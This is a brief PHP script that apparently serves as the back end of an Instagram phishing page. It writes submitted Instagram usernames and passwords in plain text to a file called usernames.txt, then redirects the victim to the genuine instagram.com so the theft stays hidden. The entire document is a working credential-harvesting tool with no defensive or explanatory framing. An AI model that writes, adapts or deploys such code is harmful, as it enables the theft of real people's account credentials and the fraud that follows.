<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['Insta_Username'] . " Pass: " . $_POST['Insta_Password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
